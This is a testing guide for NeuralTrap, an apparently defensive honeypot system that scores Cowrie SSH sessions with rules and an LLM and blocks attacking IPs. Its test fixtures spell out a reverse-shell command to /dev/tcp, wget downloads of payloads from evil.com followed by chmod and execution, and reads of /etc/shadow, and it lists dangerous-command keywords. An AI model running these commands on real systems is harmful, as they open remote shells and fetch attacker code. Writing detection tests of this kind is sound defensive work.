# NeuralTrap — Feature-by-Feature Testing Guide

> **Project**: NeuralTrap — AI-Powered Honeypot Deception Network  
> **Stack**: Python, MySQL/MariaDB, Ollama (llama3.2), Cowrie honeypot, Streamlit, Plotly, GeoIP2

---

## Prerequisites

Before testing any feature, make sure all dependencies are running:

| Service | How to start | How to verify |
|---------|-------------|---------------|
| **MariaDB / MySQL** | `sudo systemctl start mariadb` | `mysql -u neuraltrap -pneuraltrap123 -e "SELECT 1"` |
| **Ollama + llama3.2** | `sudo systemctl start ollama` then `ollama pull llama3.2` | `ollama run llama3.2 "hello"` |
| **Cowrie honeypot** | `cd ~/cowrie && source cowrie-env/bin/activate && cowrie start` | `ss -tlnp \| grep 2222` |
| **Python venv** | `source ~/cowrie/cowrie-env/bin/activate` | `python3 -c "import mysql.connector; print('OK')"` |

> [!TIP]
> You can start everything at once with `bash start_neuraltrap.sh`

---

## 1. Database Schema (`db_schema.py` + `init_db.py`)

### What it does
Creates all 6 MySQL tables: `realtime_scores`, `attack_logs`, `login_attempts`, `file_transfers`, `labeled_sessions`, `session_summary`. Also runs `ALTER TABLE` migrations for backward-compat columns.

### How to test

```bash
# 1. Run the one-shot initializer
python3 init_db.py
# Expected: "Database schema is ready (run neuraltrap.py to ingest Cowrie logs)."

# 2. Verify every table exists
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SHOW TABLES;"
```

**Expected output** — all 6 tables:

| Tables_in_neuraltrap |
|---|
| attack_logs |
| file_transfers |
| labeled_sessions |
| login_attempts |
| realtime_scores |
| session_summary |

```bash
# 3. Verify columns (spot-check labeled_sessions for Cowrie enrichment columns)
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "DESCRIBE labeled_sessions;"
```

You should see `dwell_seconds`, `client_version`, `hassh`, and `tty_log_path` columns.

```bash
# 4. Idempotency test — run init_db.py again, it should succeed without errors
python3 init_db.py
```

---

## 2. LLM Classifier (`llm_classifier.py`)

### What it does
- `classify_with_llm()` — sends commands + session intel to Ollama llama3.2 and returns structured JSON (attack_type, threat_score, confidence, reasoning, predicted_next).
- `rule_based_score()` — instant keyword-based scoring (no LLM needed).
- Includes fallback parsing and validation when LLM output is malformed.

### How to test

```bash
# Built-in test suite — runs 4 attack scenarios against the LLM
python3 llm_classifier.py
```

**Check each test result for:**

| Test | Expected attack_type | Expected threat_score range |
|------|---------------------|----------------------------|
| TEST 1 — Ransomware | `Ransomware Deployment` | 0.85 – 1.0 |
| TEST 2 — Recon | `Reconnaissance` | 0.1 – 0.4 |
| TEST 3 — Data Exfil | `Data Exfiltration` | 0.6 – 0.9 |
| TEST 4 — Brute Force | `Brute Force` | 0.3 – 0.9 |

### Test rule-based scoring manually

```python
python3 -c "
from llm_classifier import rule_based_score

# High-threat commands → 0.75
assert rule_based_score('wget http://evil.com/payload') == 0.75
assert rule_based_score('chmod +x exploit.sh') == 0.75
assert rule_based_score('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1') == 0.75

# Medium-threat commands → 0.40
assert rule_based_score('cat /etc/shadow') == 0.40
assert rule_based_score('ifconfig') == 0.40
assert rule_based_score('ps aux') == 0.40

# Low-threat commands → 0.10
assert rule_based_score('ls') == 0.10
assert rule_based_score('pwd') == 0.10

# Unknown commands → 0.15
assert rule_based_score('some_random_thing') == 0.15

print('All rule_based_score tests passed!')
"
```

### Test with session intel (Cowrie enrichment context)

```python
python3 -c "
from llm_classifier import classify_with_llm

intel = '''ADDITIONAL COWRIE SESSION INTELLIGENCE:
- SSH client version: SSH-2.0-libssh2_1.9.0
- HASSH fingerprint: abc123def456
- Authentication activity:
  · cowrie.login.failed user=root success=False password=r…[REDACTED] (len 6)
  · cowrie.login.failed user=admin success=False password=a…[REDACTED] (len 5)
  · cowrie.login.success user=root success=True password=r…[REDACTED] (len 6)
- Dwell time (seconds): 45.30'''

result = classify_with_llm(['whoami', 'uname -a', 'cat /etc/passwd'], intel)
print(f'Type: {result[\"attack_type\"]}')
print(f'Score: {result[\"threat_score\"]:.0%}')
print(f'Reasoning: {result[\"reasoning\"]}')
"
```

---

## 3. Cowrie Context Helpers (`cowrie_context.py`)

### What it does
Session state management, timestamp parsing, TTY path resolution, and formatting session intel into a plain-text block for LLM prompts (with password redaction).

### How to test

```python
python3 -c "
from cowrie_context import (
    new_session_state, parse_cowrie_timestamp,
    resolve_tty_path, format_session_intel_for_llm,
    redact_password, kex_payload_for_db
)
from datetime import datetime

# 1. Test session state initialization
s = new_session_state('192.168.1.100')
assert s['src_ip'] == '192.168.1.100'
assert s['commands'] == []
assert s['blocked'] == False
assert s['login_fail_count'] == 0
print('✅ new_session_state OK')

# 2. Test timestamp parsing
ts = parse_cowrie_timestamp('2025-01-15T10:30:00.123456Z')
assert isinstance(ts, datetime)
ts2 = parse_cowrie_timestamp(None)
assert ts2 is None
ts3 = parse_cowrie_timestamp('invalid')
assert ts3 is None
print('✅ parse_cowrie_timestamp OK')

# 3. Test password redaction
assert redact_password('password123') == 'p…[REDACTED] (len 11)'
assert redact_password('ab') == '[REDACTED]'
assert redact_password(None) == ''
assert redact_password('') == ''
print('✅ redact_password OK')

# 4. Test kex payload serialization
kex = kex_payload_for_db({'hassh': 'abc', 'kexAlgs': ['algo1']})
import json
parsed = json.loads(kex)
assert parsed['hassh'] == 'abc'
print('✅ kex_payload_for_db OK')

# 5. Test format_session_intel_for_llm
s['client_version'] = 'SSH-2.0-OpenSSH_8.9'
s['hassh'] = 'deadbeef1234'
s['login_rows'] = [{'event_type': 'cowrie.login.failed', 'username': 'root', 'password': 'toor', 'success': False}]
s['dwell_seconds'] = 42.5
intel = format_session_intel_for_llm(s)
assert 'ADDITIONAL COWRIE SESSION INTELLIGENCE' in intel
assert 'OpenSSH_8.9' in intel
assert 'deadbeef1234' in intel
assert 'REDACTED' in intel  # password should be redacted
print('✅ format_session_intel_for_llm OK')

print('\nAll cowrie_context tests passed!')
"
```

---

## 4. Firewall / IP Blocking (`firewall.py`)

### What it does
- Blocks IPs via `iptables` when threat score exceeds threshold (0.85).
- Logs blocks to `blocked_ips` table.
- Includes test-mode for 127.0.0.1 (skips actual iptables).
- Can unblock IPs and list all blocked IPs.

### How to test

```bash
# 1. Ensure the blocked_ips table + forensic_reports table exist
#    (firewall.py and forensic_analyst.py create their own tables on import)
python3 firewall.py
# Expected: "No high threat sessions found." if DB is empty
#           Otherwise: processes high-threat sessions
```

### Test threshold logic manually

```python
python3 -c "
from firewall import check_and_block

# This should print 'below threshold - monitoring only'
check_and_block('test-session-001', '127.0.0.1', 'Reconnaissance', 0.40)

# This should trigger a block (test mode for localhost)
check_and_block('test-session-002', '127.0.0.1', 'Ransomware Deployment', 0.95)
"
```

### Verify blocked IPs in DB

```bash
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SELECT * FROM blocked_ips;"
```

### Test unblock (if you have entries)

```python
python3 -c "
from firewall import show_blocked_ips, unblock_ip
show_blocked_ips()
# To unblock: unblock_ip('127.0.0.1')
"
```

---

## 5. Forensic Report Generator (`forensic_analyst.py`)

### What it does
Uses Ollama llama3.2 to generate plain-English forensic incident reports for attack sessions. Stores reports in `forensic_reports` table with analyst feedback capability.

### How to test

> [!IMPORTANT]
> This requires labeled sessions in the DB. Either run the full system first or insert test data.

```bash
# Insert a test labeled session if DB is empty
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
INSERT IGNORE INTO labeled_sessions (session_id, src_ip, commands, attack_type, threat_score)
VALUES ('test-session-forensic', '10.0.0.99', 'whoami uname -a wget http://evil.com/malware.sh chmod +x malware.sh ./malware.sh', 'Ransomware Deployment', 0.95);
"

# Generate reports for unanalyzed sessions
python3 forensic_analyst.py
# Expected: Generates and prints a forensic report for the test session
```

### Verify reports in DB

```bash
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
SELECT session_id, attack_type, threat_score, LEFT(report, 100) AS report_preview
FROM forensic_reports;
"
```

### Test analyst feedback

```python
python3 -c "
from forensic_analyst import add_analyst_feedback
add_analyst_feedback('test-session-forensic', 'accurate')
"
```

```bash
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
SELECT session_id, analyst_feedback FROM forensic_reports WHERE session_id='test-session-forensic';
"
```

---

## 6. Log Ingestion (`log_to_db.py`)

### What it does
Legacy standalone watcher — reads Cowrie JSON logs and inserts into `attack_logs`. (Note: `neuraltrap.py` does the same thing plus enrichment, so don't run both simultaneously.)

### How to test

```bash
# 1. Start the watcher
python3 log_to_db.py &

# 2. Simulate a Cowrie log entry
echo '{"eventid":"cowrie.command.input","session":"test-logdb-001","src_ip":"10.10.10.10","input":"whoami","timestamp":"2025-01-15T10:00:00Z"}' >> ~/cowrie/var/log/cowrie/cowrie.json

# 3. Wait a moment, then check
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
SELECT session_id, event_type, src_ip, command 
FROM attack_logs 
WHERE session_id='test-logdb-001';
"

# 4. Kill the background watcher
kill %1
```

---

## 7. Reclassification (`reclassify_with_llm.py`)

### What it does
Batch-reclassifies up to 500 existing labeled sessions using the LLM, then prints the new distribution.

### How to test

```bash
# Only run if you have labeled_sessions in the DB
python3 reclassify_with_llm.py
```

**Expected output:**
```
Reclassifying sessions with LLM...
Found N sessions to reclassify
[1/500] abcd1234 → Reconnaissance (25%)
[2/500] efgh5678 → Ransomware Deployment (92%)
...
Done! Success: X Failed: Y

New Dataset Summary:
--------------------------------------------------
Reconnaissance: N sessions, avg threat: XX%
Brute Force: N sessions, avg threat: XX%
Data Exfiltration: N sessions, avg threat: XX%
Ransomware Deployment: N sessions, avg threat: XX%
```

---

## 8. Main Engine — End-to-End (`neuraltrap.py`)

### What it does
The core engine that watches Cowrie JSON logs in real-time and:
- Parses all Cowrie event types (connect, login, command, kex, file transfer, TTY close, session close)
- Stores events in `attack_logs`, `login_attempts`, `file_transfers`, `session_summary`
- Runs rule-based instant scoring on every command
- Triggers LLM classification every 3 commands or on dangerous keywords
- Auto-blocks high-threat IPs via iptables
- Generates forensic reports in background threads
- Persists labeled sessions with Cowrie enrichment data

### How to test (simulated Cowrie logs)

> [!WARNING]
> Do NOT run `log_to_db.py` at the same time — it would create duplicate entries.

#### Step 1: Start NeuralTrap

```bash
python3 neuraltrap.py
```

You should see the ASCII banner and:
```
✅ Watching: /home/<user>/cowrie/var/log/cowrie
✅ LLM classifier ready
✅ Rule-based scorer ready
✅ Firewall module ready
✅ Cowrie enrichment (auth, files, client/HASSH, dwell, TTY metadata)
🛡️  NeuralTrap is now protecting your network...
```

#### Step 2: Simulate a full attack session

In another terminal, append these lines **one at a time** (with 1-2 second pauses) to the Cowrie log file:

```bash
LOG=~/cowrie/var/log/cowrie/cowrie.json

# Session connect
echo '{"eventid":"cowrie.session.connect","session":"SIM-001","src_ip":"203.0.113.50","timestamp":"2025-01-15T12:00:00Z"}' >> $LOG
sleep 1

# Client version
echo '{"eventid":"cowrie.client.version","session":"SIM-001","src_ip":"203.0.113.50","version":"SSH-2.0-libssh2_1.10.0","timestamp":"2025-01-15T12:00:01Z"}' >> $LOG
sleep 1

# KEX / HASSH
echo '{"eventid":"cowrie.client.kex","session":"SIM-001","src_ip":"203.0.113.50","hassh":"ec7378c1a92f5a8dde7e8b7a1ddf33d1","hasshAlgorithms":"curve25519-sha256","timestamp":"2025-01-15T12:00:02Z"}' >> $LOG
sleep 1

# Failed login
echo '{"eventid":"cowrie.login.failed","session":"SIM-001","src_ip":"203.0.113.50","username":"root","password":"admin123","timestamp":"2025-01-15T12:00:03Z"}' >> $LOG
sleep 1

# Successful login
echo '{"eventid":"cowrie.login.success","session":"SIM-001","src_ip":"203.0.113.50","username":"root","password":"toor","timestamp":"2025-01-15T12:00:04Z"}' >> $LOG
sleep 1

# Commands (recon → escalation → malware download)
echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"whoami","timestamp":"2025-01-15T12:00:10Z"}' >> $LOG
sleep 2

echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"uname -a","timestamp":"2025-01-15T12:00:12Z"}' >> $LOG
sleep 2

echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"cat /etc/passwd","timestamp":"2025-01-15T12:00:14Z"}' >> $LOG
sleep 2

# This is the 3rd command → triggers LLM classification
# Also: wget is a "dangerous keyword" → would trigger regardless

echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"wget http://evil.com/backdoor.sh","timestamp":"2025-01-15T12:00:20Z"}' >> $LOG
sleep 3

echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"chmod +x backdoor.sh","timestamp":"2025-01-15T12:00:25Z"}' >> $LOG
sleep 2

echo '{"eventid":"cowrie.command.input","session":"SIM-001","src_ip":"203.0.113.50","input":"./backdoor.sh","timestamp":"2025-01-15T12:00:28Z"}' >> $LOG
sleep 3

# File download event
echo '{"eventid":"cowrie.session.file_download","session":"SIM-001","src_ip":"203.0.113.50","url":"http://evil.com/backdoor.sh","outfile":"/tmp/backdoor.sh","shasum":"abc123def456","timestamp":"2025-01-15T12:00:30Z"}' >> $LOG
sleep 1

# TTY log closed
echo '{"eventid":"cowrie.log.closed","session":"SIM-001","src_ip":"203.0.113.50","ttylog":"ttylogs/SIM-001.log","size":4096,"shasum":"sha256hash","duration":30.5,"timestamp":"2025-01-15T12:00:35Z"}' >> $LOG
sleep 1

# Session closed
echo '{"eventid":"cowrie.session.closed","session":"SIM-001","src_ip":"203.0.113.50","duration":35.0,"timestamp":"2025-01-15T12:00:35Z"}' >> $LOG
```

#### Step 3: What to look for in NeuralTrap output

| Expected log line | What it means |
|---|---|
| `🔌 New connection: 203.0.113.50 [SIM-001]` | Session connect parsed |
| `🧩 [SIM-001] client version: SSH-2.0-libssh2_1.10.0` | Client version captured |
| `🔐 [SIM-001] HASSH: ec7378c1a92f5a8d…` | HASSH fingerprint captured |
| `🔑 [SIM-001] login FAILED user='root'` | Failed login recorded |
| `✅ [SIM-001] login OK user='root'` | Successful login recorded |
| `⌨️ [SIM-001] whoami` | Command captured |
| `⚡ Instant score: 10%` | Rule-based score for `whoami` |
| `⚡ Instant score: 75%` | Rule-based score for `wget` |
| `🧠 Running LLM classification...` | LLM triggered (3rd cmd or dangerous keyword) |
| `🎯 LLM Result: Ransomware Deployment \| Score: 9X%` | LLM classified the session |
| `🚨 HIGH THREAT DETECTED` | Threat exceeded block threshold |
| `🚨 BLOCKED: 203.0.113.50` | IP blocked (or test mode for localhost) |
| `⬇️ [SIM-001] download http://evil.com/backdoor.sh` | File download event |
| `📼 [SIM-001] TTY log closed` | TTY metadata captured |
| `📋 Report generated for SIM-001` | Forensic report written |

#### Step 4: Verify database state

```bash
# Check all tables got populated
mysql -u neuraltrap -pneuraltrap123 neuraltrap <<'SQL'
SELECT '--- attack_logs ---' AS t;
SELECT session_id, event_type, src_ip, LEFT(command,60) AS cmd FROM attack_logs WHERE session_id='SIM-001';

SELECT '--- login_attempts ---' AS t;
SELECT session_id, event_type, username, success FROM login_attempts WHERE session_id='SIM-001';

SELECT '--- file_transfers ---' AS t;
SELECT session_id, direction, url, shasum FROM file_transfers WHERE session_id='SIM-001';

SELECT '--- session_summary ---' AS t;
SELECT session_id, src_ip, dwell_seconds, client_version, hassh, login_fail_count, download_count FROM session_summary WHERE session_id='SIM-001';

SELECT '--- labeled_sessions ---' AS t;
SELECT session_id, attack_type, threat_score, dwell_seconds, client_version, hassh FROM labeled_sessions WHERE session_id='SIM-001';

SELECT '--- realtime_scores ---' AS t;
SELECT session_id, command, attack_type, threat_score, command_number FROM realtime_scores WHERE session_id='SIM-001';

SELECT '--- forensic_reports ---' AS t;
SELECT session_id, attack_type, threat_score, LEFT(report,100) AS report_start FROM forensic_reports WHERE session_id='SIM-001';

SELECT '--- blocked_ips ---' AS t;
SELECT ip_address, attack_type, threat_score, reason FROM blocked_ips WHERE ip_address='203.0.113.50';
SQL
```

---

## 9. Streamlit Dashboard (`dashboard.py`)

### How to start

```bash
streamlit run dashboard.py --server.port 8501
# Open http://localhost:8501
```

### Test each page

#### 🏠 Overview
| Check | Expected |
|-------|----------|
| 4 metric cards load | Total Sessions, Commands Captured, IPs Blocked, High Threat Sessions |
| Pie chart renders | Attack Type Distribution (needs labeled_sessions data) |
| Bar chart renders | Avg Threat Score by Attack Type |
| Recent sessions table | Shows last 10 labeled sessions |

#### ⚔️ Live Attacks
| Check | Expected |
|-------|----------|
| Command feed loads | Shows last 50 `cowrie.command.input` events |
| Dangerous commands highlighted in red | `wget`, `curl`, `chmod`, `passwd`, `shadow` |
| Safe commands in green | `ls`, `whoami`, etc. |

#### 🔬 Cowrie Intel
| Check | Expected |
|-------|----------|
| 4 metrics | Login events, File transfers, Sessions summarized, Avg dwell |
| Login table | Shows recent auth events (passwords show `[stored]` not cleartext) |
| File transfers table | Shows uploads/downloads with SHA256 |
| Session summary table | Shows dwell time, client version, HASSH, TTY path |
| Labeled sessions + sidecar | Shows enriched labeled sessions |

#### 🧠 AI Predictions
| Check | Expected |
|-------|----------|
| Sessions listed by threat score | Highest first |
| Color-coded threat indicators | 🔴 ≥85%, 🟡 ≥50%, 🟢 <50% |
| Progress bars | Visual threat score |

#### 📋 Forensic Reports
| Check | Expected |
|-------|----------|
| Expandable report cards | Click to read full LLM-generated report |
| Feedback buttons work | ✅ Accurate / ❌ Inaccurate |
| Feedback persists | Shows "Current: accurate/inaccurate" after clicking |

#### 🚫 Blocked IPs
| Check | Expected |
|-------|----------|
| Blocked IPs table | Shows IP, attack type, score, timestamp, reason |
| Bar chart | Blocks by attack type |
| Metrics | Total Blocked IPs, Ransomware Attempts Blocked |

#### 👤 Attacker Profiles
| Check | Expected |
|-------|----------|
| Grouped by src_ip | Each IP shows session count, avg/max threat |
| Blocked status | 🔴 BLOCKED or 🟡 MONITORING |
| Progress bar | Shows max threat score visually |

#### 🌍 Attack World Map
| Check | Expected |
|-------|----------|
| GeoIP map renders | Scatter plot on world map (requires GeoLite2 DB + non-localhost IPs) |
| Top countries bar chart | Shows attack count by country |

> [!NOTE]
> The world map only works with real external IPs and a valid GeoLite2-City.mmdb file at `~/cowrie/geoip/GeoLite2-City.mmdb`. Localhost (127.0.0.1) is filtered out.

#### 📈 Live Threat Monitor
| Check | Expected |
|-------|----------|
| Top 5 sessions with threat bars | Color-coded status (BLOCKED/HIGH RISK/MONITORING/LOW RISK) |
| Histogram | Threat score distribution with block threshold line at 85% |
| Timeline chart | Threat scores over session IDs with threshold line |
| 4 summary metrics | High/Medium/Low threat counts + average score |

#### Auto-refresh
| Check | Expected |
|-------|----------|
| Sidebar checkbox "Auto Refresh (10s)" | When enabled, page reloads every 10 seconds |

---

## 10. Quick Smoke Test Checklist

Use this for a fast pass/fail verification after setup:

```
[ ] python3 init_db.py                     → prints "schema is ready"
[ ] mysql ... -e "SHOW TABLES"             → 6+ tables exist
[ ] python3 llm_classifier.py              → 4 tests run, all return valid JSON
[ ] python3 firewall.py                    → runs without crash
[ ] python3 forensic_analyst.py            → generates reports (or "no sessions")
[ ] python3 neuraltrap.py                  → banner prints, watching message appears
[ ] Append simulated JSON to cowrie.json   → events appear in NeuralTrap output
[ ] streamlit run dashboard.py             → loads at http://localhost:8501
[ ] Dashboard Overview page                → metrics and charts render
[ ] Dashboard Cowrie Intel page            → login/file/session tables render
```

---

## 11. Common Issues & Debugging

| Issue | Cause | Fix |
|-------|-------|-----|
| `Access denied for user 'neuraltrap'` | MySQL user doesn't exist | `CREATE USER 'neuraltrap'@'localhost' IDENTIFIED BY 'neuraltrap123'; GRANT ALL ON neuraltrap.* TO 'neuraltrap'@'localhost';` |
| `Table 'blocked_ips' doesn't exist` | `firewall.py` or `forensic_analyst.py` not run yet | Run `python3 firewall.py` and `python3 forensic_analyst.py` once |
| `ollama` connection refused | Ollama service not running | `sudo systemctl start ollama` |
| `model 'llama3.2' not found` | Model not pulled | `ollama pull llama3.2` |
| No data on dashboard | No Cowrie logs processed yet | Run simulated attack from Section 8 |
| World Map shows "GeoIP error" | Missing GeoLite2 database | Download from MaxMind and place at `~/cowrie/geoip/GeoLite2-City.mmdb` |
| `watchdog` import error | Missing Python package | `pip install watchdog` |

---

## Summary of Test Commands (Quick Reference)

```bash
# Database
python3 init_db.py

# LLM Classifier (4 built-in tests)
python3 llm_classifier.py

# Firewall module
python3 firewall.py

# Forensic reports
python3 forensic_analyst.py

# Reclassify existing sessions
python3 reclassify_with_llm.py

# Main engine
python3 neuraltrap.py

# Dashboard
streamlit run dashboard.py --server.port 8501
```
